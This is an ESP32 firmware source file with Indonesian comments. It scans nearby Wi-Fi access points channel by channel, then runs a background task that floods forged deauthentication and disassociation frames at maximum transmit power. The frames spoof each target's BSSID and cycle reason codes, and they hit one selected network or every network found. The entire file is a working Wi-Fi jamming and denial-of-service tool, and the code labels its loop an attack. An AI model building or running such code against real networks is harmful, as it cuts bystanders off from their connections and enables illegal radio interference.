#include "deauth.h"
#include "esp_bt.h"
#include "RF24.h"
#include <WiFi.h>
#include <esp_wifi.h>

#define NRF1_CE_PIN   27
#define NRF1_CSN_PIN  21
#define NRF2_CE_PIN   26
#define NRF2_CSN_PIN  13

int targetCount = 0;
int selectedTargetIndex = -1;
bool isAttacking = false;
unsigned long packetCount = 0;
TargetInfo targets[20];

uint8_t deauthPacket[26] = {
  0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x07, 0x00
};

uint8_t disassocPacket[26] = {
  0xA0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x07, 0x00
};

void powerDownNRF() {
  pinMode(NRF1_CE_PIN, OUTPUT); pinMode(NRF1_CSN_PIN, OUTPUT);
  digitalWrite(NRF1_CE_PIN, LOW); digitalWrite(NRF1_CSN_PIN, HIGH);
  pinMode(NRF2_CE_PIN, OUTPUT); pinMode(NRF2_CSN_PIN, OUTPUT);
  digitalWrite(NRF2_CE_PIN, LOW); digitalWrite(NRF2_CSN_PIN, HIGH);
  
  SPI.begin(18, 19, 23, 21); 
  SPI.setFrequency(16000000);
  
  // Power Down NRF1
  digitalWrite(NRF1_CSN_PIN, LOW); SPI.transfer(0x20); SPI.transfer(0x00); digitalWrite(NRF1_CSN_PIN, HIGH);
  // Power Down NRF2
  digitalWrite(NRF2_CSN_PIN, LOW); SPI.transfer(0x20); SPI.transfer(0x00); digitalWrite(NRF2_CSN_PIN, HIGH);
}

// FUNGSI SCAN MANUAL PER CHANNEL (Jauh Lebih Kuat)
void performWiFiScan() {
  esp_bt_controller_disable();
  powerDownNRF(); // Matikan NRF biar gak ngeganggu
  
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(500);

  targetCount = 0;
  Serial.println("[DEAUTH] Memulai Scan Per Channel (Deep Scan)...");

  // Paksa ESP32 memindai 1 sampai 13 channel satu per satu
  for (int ch = 1; ch <= 13; ch++) {
    // Paksa WiFi diam di channel ini
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    delay(50); // Tunggu 50ms agar radio WiFi siap mendengarkan

    // Scan dengan waktu tunggu 150ms per channel
    int n = WiFi.scanNetworks(false, true, false, 150, ch); 
    
    for (int i = 0; i < n; i++) {
      if (targetCount >= 20) break;

      String ssid = WiFi.SSID(i);
      if (ssid == "") ssid = "[Hidden]";

      int rssi = WiFi.RSSI(i);
      
      // Simpan jika sinyal cukup kuat
      if (rssi > -90) {
        // Cek duplikat (kadang 1 AP ke-detect 2x di channel berbeda)
        bool isDuplicate = false;
        for(int j=0; j<targetCount; j++) {
          if(memcmp(targets[j].bssid, WiFi.BSSID(i), 6) == 0) {
            isDuplicate = true; break;
          }
        }

        if (!isDuplicate) {
          targets[targetCount].channel = ch;
          targets[targetCount].rssi = rssi;
          targets[targetCount].ssid = ssid;
          memcpy(targets[targetCount].bssid, WiFi.BSSID(i), 6);
          
          Serial.print("  -> "); Serial.print(ssid);
          Serial.print(" (CH:"); Serial.print(ch);
          Serial.print(", RSSI:"); Serial.print(rssi); Serial.println(")");
          
          targetCount++;
        }
      }
    }
    WiFi.scanDelete();
    delay(20); // Jeda antar channel
  }

  Serial.print("[DEAUTH] Total AP Ditemukan: ");
  Serial.println(targetCount);
}

void jammingTask(void * parameter) {
  while(true) {
    if (isAttacking) {
      WiFi.mode(WIFI_MODE_AP);
      delay(500); 
      esp_wifi_set_max_tx_power(82); 
      
      uint8_t reasonCodes[] = {0x01, 0x06, 0x07, 0x0F};
      int rIndex = 0;
      
      if (selectedTargetIndex != -1) {
        esp_wifi_set_channel(targets[selectedTargetIndex].channel, WIFI_SECOND_CHAN_NONE);
        delay(10); 
        memcpy(&deauthPacket[10], targets[selectedTargetIndex].bssid, 6);
        memcpy(&deauthPacket[16], targets[selectedTargetIndex].bssid, 6);
        memcpy(&disassocPacket[10], targets[selectedTargetIndex].bssid, 6);
        memcpy(&disassocPacket[16], targets[selectedTargetIndex].bssid, 6);
      }
      
      while (isAttacking) {
        if (selectedTargetIndex == -1) {
          for(int t = 0; t < targetCount; t++) {
            if(!isAttacking) break; 
            esp_wifi_set_channel(targets[t].channel, WIFI_SECOND_CHAN_NONE);
            delay(5); 
            memcpy(&deauthPacket[10], targets[t].bssid, 6);
            memcpy(&deauthPacket[16], targets[t].bssid, 6);
            memcpy(&disassocPacket[10], targets[t].bssid, 6);
            memcpy(&disassocPacket[16], targets[t].bssid, 6);
            
            for(int i = 0; i < 30; i++) {
              deauthPacket[24] = reasonCodes[rIndex++ % 4];
              esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
              disassocPacket[24] = reasonCodes[rIndex++ % 4];
              esp_wifi_80211_tx(WIFI_IF_AP, disassocPacket, sizeof(disassocPacket), false);
              packetCount += 2; 
            }
            vTaskDelay(1 / portTICK_PERIOD_MS); 
          }
        } else {
          for(int i = 0; i < 100; i++) {
            if(!isAttacking) break;
            deauthPacket[24] = reasonCodes[rIndex++ % 4];
            esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
            disassocPacket[24] = reasonCodes[rIndex++ % 4];
            esp_wifi_80211_tx(WIFI_IF_AP, disassocPacket, sizeof(disassocPacket), false);
            packetCount += 2;
          }
          vTaskDelay(1 / portTICK_PERIOD_MS); 
        }
      }
    } else {
      WiFi.mode(WIFI_STA);
      vTaskDelay(100 / portTICK_PERIOD_MS); 
    }
  }
}

void startJamming() { packetCount = 0; isAttacking = true; }
void stopJamming() { isAttacking = false; }

void initDeauthTask() {
  xTaskCreatePinnedToCore(jammingTask, "jamming", 4096, NULL, 1, NULL, 0);
}